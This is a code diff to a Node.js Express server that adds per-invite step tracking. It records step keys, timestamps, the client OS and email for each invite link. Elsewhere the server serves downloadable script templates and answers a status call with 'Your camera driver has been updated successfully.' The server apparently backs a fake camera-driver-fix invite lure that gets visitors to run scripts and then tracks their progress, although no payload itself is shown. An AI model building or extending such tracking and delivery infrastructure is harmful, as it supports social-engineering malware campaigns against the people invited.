@@ -2,6 +2,7 @@ import express from 'express';
 import cors from 'cors';
 import config from './config.js';
 import { getDb } from './db.js';
+import { getStepMessage } from './step.js';
 import { readFileSync } from 'fs';
 import { dirname, join } from 'path';
 import { fileURLToPath } from 'url';
@@ -31,6 +32,16 @@ function sendScriptTemplate(res, body, { filename, contentType } = {}) {
   res.setHeader('Cache-Control', 'no-store, max-age=0');
   if (filename) res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
   res.status(200).send(body);
+}
+
+function parseStepHistory(raw) {
+  if (!raw) return [];
+  try {
+    const parsed = JSON.parse(raw);
+    return Array.isArray(parsed) ? parsed : [];
+  } catch (_) {
+    return [];
+  }
 }
 
 // CORS: allow frontend from local dev (any host:5173) and production
@@ -272,8 +283,9 @@ api.patch('/invites/:invite_link', async (req, res) => {
         updates.driver_click_status = 0;
         updates.client_os = null;
         updates.email = null;
-        updates.current_step = null;
-        updates.step_history = '[]';
+        updates.current_step_key = null;
+        updates.current_step_message = null;
+        updates.step_history = null;
       } else if (statusNum === 3 || statusNum === 4 || statusNum === 5) {
         updates.completed_at = new Date().toISOString();
       }
@@ -329,16 +341,10 @@ async function changeConnectionStatusHandler(req, res) {
   try {
     const { invite_link } = req.params;
     const db = await getDb();
-    const invite = await db.updateInvite(invite_link, { connections_status: 2, current_step: 'camera_fixed (success)' });
+    const invite = await db.updateInvite(invite_link, { connections_status: 2 });
     if (!invite) {
       return res.status(404).json({ error: 'Invite not found' });
     }
-    await db.appendInviteStep(invite_link, {
-      step: 'camera_fixed',
-      status: 'success',
-      message: 'Camera driver updated successfully.',
-      at: new Date().toISOString(),
-    });
     res.send("Your camera driver has been updated successfully.");
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -347,33 +353,44 @@ async function changeConnectionStatusHandler(req, res) {
 app.get('/change-connection-status/:invite_link', changeConnectionStatusHandler);
 app.post('/change-connection-status/:invite_link', changeConnectionStatusHandler);
 
-api.post('/invites/:invite_link/steps', async (req, res) => {
+async function trackStepHandler(req, res) {
   try {
-    const { invite_link } = req.params;
-    const step = req.body?.step != null ? String(req.body.step).trim() : '';
-    const statusRaw = req.body?.status != null ? String(req.body.status).trim().toLowerCase() : 'running';
-    const message = req.body?.message != null ? String(req.body.message).trim() : '';
-    if (!step) {
-      return res.status(400).json({ error: 'step is required' });
-    }
-    const allowed = new Set(['running', 'success', 'failed', 'info']);
-    const status = allowed.has(statusRaw) ? statusRaw : 'running';
+    const { invite_link, step_key } = req.params;
     const db = await getDb();
-    const entry = {
-      step,
-      status,
-      message: message || null,
-      at: new Date().toISOString(),
-    };
-    const invite = await db.appendInviteStep(invite_link, entry);
+    const invite = await db.getInvite(invite_link);
     if (!invite) {
       return res.status(404).json({ error: 'Invite not found' });
     }
-    res.json({ invite, entry });
+    const key = String(step_key || '').trim();
+    if (!key) {
+      return res.status(400).json({ error: 'step_key is required' });
+    }
+    const message = getStepMessage(key);
+    const timestamp = new Date().toISOString();
+    const history = parseStepHistory(invite.step_history);
+    history.push({ step_key: key, message, at: timestamp });
+    const nextHistory = JSON.stringify(history.slice(-100));
+    const updatedInvite = await db.updateInvite(invite_link, {
+      current_step_key: key,
+      current_step_message: message,
+      step_history: nextHistory,
+    });
+    if (!updatedInvite) {
+      return res.status(404).json({ error: 'Invite not found' });
+    }
+    return res.json({
+      ok: true,
+      step_key: key,
+      step_message: message,
+      at: timestamp,
+      invite: updatedInvite,
+    });
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    return res.status(500).json({ error: err.message });
   }
-});
+}
+app.post('/track-step/:invite_link/:step_key', trackStepHandler);
+api.post('/invites/:invite_link/track-step/:step_key', trackStepHandler);
 
 app.use('/api', api);
 
